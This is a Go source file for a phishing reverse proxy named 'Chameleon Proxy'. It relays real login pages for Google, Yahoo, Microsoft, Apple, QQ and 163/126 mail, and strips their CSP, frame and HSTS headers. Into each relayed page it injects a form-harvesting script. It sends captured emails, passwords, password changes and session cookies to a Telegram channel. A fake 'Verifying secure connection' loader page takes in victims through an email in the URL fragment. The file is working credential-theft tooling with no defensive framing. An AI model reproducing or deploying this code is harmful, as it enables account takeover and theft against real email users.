package main

import (
	"io"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
	"sync"

	"github.com/gin-gonic/gin"
)

type SessionStore struct {
	mu       sync.RWMutex
	sessions map[string]*SessionData
}

type SessionData struct {
	Cookies   map[string]string
	UserEmail string
}

var store = &SessionStore{
	sessions: make(map[string]*SessionData),
}

const harvesterScript = `
<script>
document.addEventListener('submit', function(e) {
    const form = e.target;
    const formData = new FormData(form);
    const params = new URLSearchParams();
    let hasEmail = false;
    let hasPassword = false;

    for (let [key, value] of formData.entries()) {
        params.append(key, value);
        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account') || key.toLowerCase().includes('login')) {
            window._capturedEmail = value;
            hasEmail = true;
        }
        if (key.toLowerCase().includes('pass')) {
            window._capturedPass = value;
            hasPassword = true;
        }
    }

    if (hasEmail && hasPassword) {
        fetch('/api/harvest', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: params.toString()
        }).catch(() => {});
    }
}, true);
</script>
`

func StartProxy(cfg TelegramConfig, listenPort string) {
	r := gin.Default()

	// Serve the Loader HTML on root to keep URL as /#email
	r.GET("/", func(c *gin.Context) {
		c.Header("Content-Type", "text/html")
		c.String(200, loaderHTML)
	})

	// API that fetches the page via Reverse Proxy
	r.GET("/api/fetch", func(c *gin.Context) {
		email := c.Query("email")
		if email == "" {
			c.String(400, "Email missing")
			return
		}

		targetBase := GetTargetDomain(email)
		log.Printf("[PROXY] Smart Routing %s to %s", email, targetBase)

		targetURL, err := url.Parse(targetBase)
		if err != nil {
			c.String(500, "Invalid Target URL")
			return
		}

		proxy := httputil.NewSingleHostReverseProxy(targetURL)

		originalDirector := proxy.Director
		proxy.Director = func(req *http.Request) {
			originalDirector(req)
			req.Host = targetURL.Host
			// Spoof Browser Headers
			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
			req.Header.Set("Accept-Language", "en-US,en;q=0.9")
			req.Header.Set("Sec-Fetch-Dest", "document")
			req.Header.Set("Sec-Fetch-Mode", "navigate")
			req.Header.Set("Sec-Fetch-Site", "none")
		}

		proxy.ModifyResponse = func(resp *http.Response) error {
			// Strip security headers that break the proxy
			resp.Header.Del("Content-Security-Policy")
			resp.Header.Del("X-Frame-Options")
			resp.Header.Del("Strict-Transport-Security")

			bodyBytes, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			bodyStr := string(bodyBytes)

			// Rewrite absolute links to point to our proxy
			bodyStr = strings.ReplaceAll(bodyStr, "https://"+targetURL.Host, c.Request.Host+"/proxy")
			bodyStr = strings.ReplaceAll(bodyStr, "http://"+targetURL.Host, c.Request.Host+"/proxy")

			// Inject Base Tag and Harvester
			baseTag := `<base href="` + targetBase + `">`
			if strings.Contains(bodyStr, "<head>") {
				bodyStr = strings.Replace(bodyStr, "<head>", "<head>\n"+baseTag, 1)
			} else {
				bodyStr = baseTag + bodyStr
			}
			bodyStr = strings.Replace(bodyStr, "</body>", harvesterScript+"</body>", 1)

			resp.Body = io.NopCloser(strings.NewReader(bodyStr))
			resp.ContentLength = int64(len(bodyStr))
			resp.Header.Set("Content-Length", string(rune(len(bodyStr))))

			// Telegram alert for cookies
			for _, cookie := range resp.Cookies() {
				SendTelegramMessage(cfg, FormatCookieHarvest(email, []string{cookie.Name + "=" + cookie.Value}))
			}

			return nil
		}

		proxy.ServeHTTP(c.Writer, c.Request)
	})

	// Catch-all proxy for CSS, JS, and Images
	r.Any("/proxy/*filepath", func(c *gin.Context) {
		filepath := c.Param("filepath")
		filepath = strings.TrimPrefix(filepath, "/")

		referer := c.GetHeader("Referer")
		targetDomain := "https://accounts.google.com/"

		if strings.Contains(referer, "yahoo.com") {
			targetDomain = "https://login.yahoo.com/"
		} else if strings.Contains(referer, "126.com") {
			targetDomain = "https://mail.126.com/"
		} else if strings.Contains(referer, "163.com") {
			targetDomain = "https://mail.163.com/"
		} else if strings.Contains(referer, "live.com") {
			targetDomain = "https://login.live.com/"
		} else if strings.Contains(referer, "qq.com") {
			targetDomain = "https://mail.qq.com/"
		} else if strings.Contains(referer, "icloud.com") {
			targetDomain = "https://appleid.apple.com/"
		}

		fullURL := targetDomain + filepath
		outReq, _ := http.NewRequest(c.Request.Method, fullURL, c.Request.Body)

		for key, values := range c.Request.Header {
			for _, value := range values {
				outReq.Header.Add(key, value)
			}
		}

		proxyClient := &http.Client{}
		resp, err := proxyClient.Do(outReq)
		if err != nil {
			c.String(502, "Upstream Error")
			return
		}
		defer resp.Body.Close()

		for key, values := range resp.Header {
			for _, value := range values {
				c.Writer.Header().Add(key, value)
			}
		}
		c.Writer.WriteHeader(resp.StatusCode)
		io.Copy(c.Writer, resp.Body)
	})

	// Harvest API
	r.POST("/api/harvest", func(c *gin.Context) {
		contentType := c.ContentType()
		if contentType == "application/json" {
			var payload map[string]interface{}
			c.ShouldBindJSON(&payload)
			if t, ok := payload["type"].(string); ok && t == "pass_change" {
				SendTelegramMessage(cfg, FormatPasswordChange(payload["old"].(string), payload["new"].(string), "Unknown"))
			}
		} else {
			c.Request.ParseForm()
			email := c.PostForm("email")
			password := c.PostForm("password")

			if email == "" {
				email = c.PostForm("username")
			}
			if email == "" {
				email = c.PostForm("account")
			}
			if email == "" {
				email = c.PostForm("login")
			}

			if password == "" {
				password = c.PostForm("passwd")
			}
			if password == "" {
				password = c.PostForm("pwd")
			}
			if password == "" {
				password = c.PostForm("password")
			}

			ip := c.ClientIP()
			userAgent := c.GetHeader("User-Agent")
			SendTelegramMessage(cfg, FormatLoginAlert(email, password, ip, userAgent))
		}
		c.JSON(200, gin.H{"status": "ok"})
	})

	log.Printf("🚀 Chameleon Proxy listening on 0.0.0.0:%s", listenPort)
	r.Run("0.0.0.0:" + listenPort)
}

// Embedded Loader HTML to prevent URL changes
const loaderHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying Secure Connection...</title>
    <style>
        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f5f5f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .container { text-align: center; background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #4285F4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #333; font-size: 16px; margin: 0; font-weight: 500; }
    </style>
</head>
<body>
    <div class="container" id="loader">
        <div class="spinner"></div>
        <p id="status-text">Verifying secure connection...</p>
    </div>
    <script>
        setTimeout(function() {
            var hash = window.location.hash;
            if (hash && hash.length > 1) {
                var email = hash.substring(1); 
                fetch('/api/fetch?email=' + encodeURIComponent(email))
                    .then(response => response.text())
                    .then(html => {
                        document.open();
                        document.write(html);
                        document.close();
                    })
                    .catch(err => {
                        document.getElementById('status-text').innerHTML = "Connection failed.";
                        document.querySelector('.spinner').style.display = "none";
                    });
            } else {
                document.getElementById('status-text').innerHTML = "No account specified.";
                document.querySelector('.spinner').style.display = "none";
            }
        }, 1000);
    </script>
</body>
</html>
`
